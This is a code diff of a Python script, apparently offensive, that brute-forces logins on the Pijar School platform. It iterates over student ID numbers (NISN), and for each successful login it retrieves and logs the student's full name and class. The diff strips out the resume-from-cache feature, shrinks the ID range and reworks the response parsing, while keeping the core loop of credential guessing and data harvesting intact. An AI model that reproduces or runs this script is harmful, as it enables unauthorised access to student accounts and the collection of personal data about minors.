@@ -5,8 +5,6 @@ import random
 from datetime import datetime
 import sys
 import threading
-import os
-import argparse
 
 # Colors for console output
 class Colors:
@@ -18,9 +16,8 @@ class Colors:
     CYAN = '\033[96m'
     RESET = '\033[0m'
 
-# Files for logging
+# File to log successful logins
 log_file = "logs.txt"
-cache_file = "cache.txt"
 
 # Headers for login request
 login_headers = {
@@ -114,31 +111,12 @@ def get_user_status(token):
         print(f"{Colors.RED}>> Error during status request: {str(e)}{Colors.RESET}")
         return None
 
-# Function to log successful login details - now writes immediately
+# Function to log successful login details
 def log_success(nisn, class_name, full_name):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with open(log_file, 'a') as f:
         f.write(f"[{timestamp}] [{class_name}] [{full_name}] : [{nisn}]\n")
-        f.flush()  # Force write to disk immediately
     print(f"{Colors.GREEN}>> User details logged to {log_file}{Colors.RESET}")
-
-# Function to update cache with attempted NISN
-def update_cache(nisn):
-    with open(cache_file, 'a') as f:
-        f.write(f"{nisn}\n")
-        f.flush()  # Force write to disk immediately
-
-# Function to get the last attempted NISN from cache
-def get_last_nisn():
-    if not os.path.exists(cache_file):
-        return None
-    
-    with open(cache_file, 'r') as f:
-        lines = f.readlines()
-        if lines:
-            return lines[-1].strip()
-    
-    return None
 
 # Function to listen for exit command
 def exit_listener():
@@ -154,34 +132,16 @@ def exit_listener():
 def main():
     global running
     
-    # Parse command line arguments
-    parser = argparse.ArgumentParser(description='Pijar School Brute Force Script')
-    parser.add_argument('--last', action='store_true', help='Continue from last attempted NISN')
-    args = parser.parse_args()
-    
-    # Default NISN range
     start_nisn = 89600040  # Starting from 002000000
-    end_nisn = 99999999    # Ending at 009999999
-    
-    # If --last flag is set, get the last attempted NISN from cache
-    if args.last:
-        last_nisn = get_last_nisn()
-        if last_nisn:
-            # Extract the numeric part and convert to integer
-            if last_nisn.startswith('00'):
-                last_nisn = int(last_nisn[2:])
-                start_nisn = last_nisn + 1
-                print(f"{Colors.BLUE}[*] Continuing from last attempt: {start_nisn}{Colors.RESET}")
+    end_nisn = 89600050    # Ending at 009999999
     
     print(f"{Colors.BLUE}[*] Starting brute force attack from {start_nisn} to {end_nisn}{Colors.RESET}")
     print(f"{Colors.BLUE}[*] Results will be logged to {log_file}{Colors.RESET}")
-    print(f"{Colors.BLUE}[*] Attempts will be cached in {cache_file}{Colors.RESET}")
     print(f"{Colors.YELLOW}[*] Type 'exit' at any time to stop the script{Colors.RESET}")
     
-    # Create logs file if it doesn't exist
-    if not os.path.exists(log_file) or not args.last:
-        with open(log_file, 'w') as f:
-            f.write(f"# Brute Force Results - {datetime.now()}\n")
+    # Create or clear the log file
+    with open(log_file, 'w') as f:
+        f.write(f"# Brute Force Results - {datetime.now()}\n")
     
     # Start the exit listener in a separate thread
     exit_thread = threading.Thread(target=exit_listener)
@@ -202,9 +162,6 @@ def main():
         
         print(f"{Colors.CYAN}>> Attempting login for NISN: {nisn} (Attempt #{attempts}){Colors.RESET}")
         
-        # Update cache with current NISN before attempting login
-        update_cache(nisn)
-        
         # Try login
         token = try_login(nisn)
         
@@ -214,12 +171,15 @@ def main():
             status_data = get_user_status(token)
             
             # If status request successful, log the details
-            if status_data and 'fullName' in status_data and 'className' in status_data:
-                class_name = status_data.get('className', 'Unknown')
-                full_name = status_data.get('fullName', 'Unknown')
+            if status_data and status_data.get('success') == True and 'data' in status_data:
+                user_data = status_data['data']
+                class_name = user_data.get('className', 'Unknown')
+                full_name = user_data.get('fullName', 'Unknown')
                 
                 print(f"{Colors.GREEN}>> Found user: {full_name}, Class: {class_name}, NISN: {nisn}{Colors.RESET}")
                 log_success(nisn, class_name, full_name)
+            else:
+                print(f"{Colors.RED}>> Failed to get user status for NISN: {nisn}{Colors.RESET}")
         else:
             failed += 1
         
